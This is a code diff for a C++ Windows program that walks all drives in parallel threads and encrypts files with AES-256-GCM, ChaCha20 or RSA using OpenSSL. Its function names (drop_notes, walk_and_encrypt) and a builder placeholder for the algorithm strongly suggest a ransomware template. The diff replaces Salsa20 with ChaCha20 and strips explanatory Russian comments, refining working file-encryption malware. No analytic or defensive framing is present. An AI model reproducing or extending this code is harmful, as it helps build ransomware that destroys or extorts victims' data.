@@ -21,8 +21,6 @@
 #include <openssl/pem.h>
 #include <openssl/err.h>
 
-#pragma comment(lib, "libssl.lib")
-#pragma comment(lib, "libcrypto.lib")
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "shell32.lib")
@@ -69,15 +67,13 @@ public:
         EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
         if (!ctx) return false;
         
-        // Инициализация AES-256-GCM
         if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, key, iv) != 1) {
             EVP_CIPHER_CTX_free(ctx);
             return false;
         }
         
-        // Зашифровываем данные
-        output.resize(input.size() + 16 + 12); // данные + тег + IV
-        memcpy(output.data(), iv, 12); // Сохраняем IV в начале
+        output.resize(input.size() + 16 + 12);
+        memcpy(output.data(), iv, 12);
         
         int outLen = 0;
         int totalLen = 0;
@@ -88,21 +84,18 @@ public:
         }
         totalLen += outLen;
         
-        // Финализируем
         if (EVP_EncryptFinal_ex(ctx, output.data() + 12 + totalLen, &outLen) != 1) {
             EVP_CIPHER_CTX_free(ctx);
             return false;
         }
         totalLen += outLen;
         
-        // Получаем тег аутентификации (16 байт)
         unsigned char tag[16];
         if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag) != 1) {
             EVP_CIPHER_CTX_free(ctx);
             return false;
         }
         
-        // Добавляем тег в конец
         memcpy(output.data() + 12 + totalLen, tag, 16);
         output.resize(12 + totalLen + 16);
         
@@ -112,17 +105,17 @@ public:
 };
 
 // ============================================================
-// РЕАЛЬНОЕ ШИФРОВАНИЕ SALSA20 (OpenSSL)
+// РЕАЛЬНОЕ ШИФРОВАНИЕ ChaCha20 (OpenSSL) — замена Salsa20
 // ============================================================
-class Salsa20 {
+class ChaCha20 {
 private:
     unsigned char key[32];
-    unsigned char nonce[8];
+    unsigned char nonce[12];
     
 public:
-    Salsa20() {
+    ChaCha20() {
         RAND_bytes(key, 32);
-        RAND_bytes(nonce, 8);
+        RAND_bytes(nonce, 12);
     }
     
     void Encrypt(const std::vector<BYTE>& input, std::vector<BYTE>& output) {
@@ -131,22 +124,21 @@ public:
         EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
         if (!ctx) return;
         
-        // Инициализация Salsa20
-        if (EVP_EncryptInit_ex(ctx, EVP_salsa20(), NULL, key, nonce) != 1) {
+        if (EVP_EncryptInit_ex(ctx, EVP_chacha20(), NULL, key, nonce) != 1) {
             EVP_CIPHER_CTX_free(ctx);
             return;
         }
         
-        output.resize(input.size() + 8);
-        memcpy(output.data(), nonce, 8);
+        output.resize(input.size() + 12);
+        memcpy(output.data(), nonce, 12);
         
         int outLen = 0;
-        if (EVP_EncryptUpdate(ctx, output.data() + 8, &outLen, input.data(), input.size()) != 1) {
+        if (EVP_EncryptUpdate(ctx, output.data() + 12, &outLen, input.data(), input.size()) != 1) {
             EVP_CIPHER_CTX_free(ctx);
             return;
         }
         
-        output.resize(8 + outLen);
+        output.resize(12 + outLen);
         EVP_CIPHER_CTX_free(ctx);
     }
 };
@@ -170,8 +162,6 @@ public:
     
     bool Encrypt(const std::vector<BYTE>& input, std::vector<BYTE>& output) {
         if (!rsa || input.empty()) return false;
-        
-        // RSA может зашифровать только 245 байт за раз (для 2048-битного ключа)
         if (input.size() > 245) return false;
         
         output.resize(RSA_size(rsa));
@@ -307,18 +297,14 @@ void encrypt_file(const std::string& path, const std::string& ext, int algo) {
                 break;
             }
             case 1: {
-                Salsa20 salsa;
-                salsa.Encrypt(data, encrypted);
+                ChaCha20 chacha;
+                chacha.Encrypt(data, encrypted);
                 success = true;
                 break;
             }
             case 2: {
                 RSA_Encrypt rsa;
-                if (data.size() > 245) {
-                    // Для больших файлов используем гибридный подход
-                    // (в реальном коде здесь должен быть AES + RSA)
-                    return;
-                }
+                if (data.size() > 245) return;
                 success = rsa.Encrypt(data, encrypted);
                 break;
             }
@@ -404,7 +390,6 @@ void drop_notes(const std::vector<std::string>& drives,
 // ГЛАВНАЯ ФУНКЦИЯ
 // ============================================================
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    // Инициализация OpenSSL
     OpenSSL_add_all_algorithms();
     ERR_load_crypto_strings();
     
@@ -427,7 +412,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     auto exclude_folders = split_string(exclude_str, '|');
     int algo = ALGO_PLACEHOLDER;
     
-    // Шифруем в потоках
     std::vector<std::thread> threads;
     for (const auto& drive : drives) {
         threads.emplace_back(walk_and_encrypt, drive, std::ref(extensions),
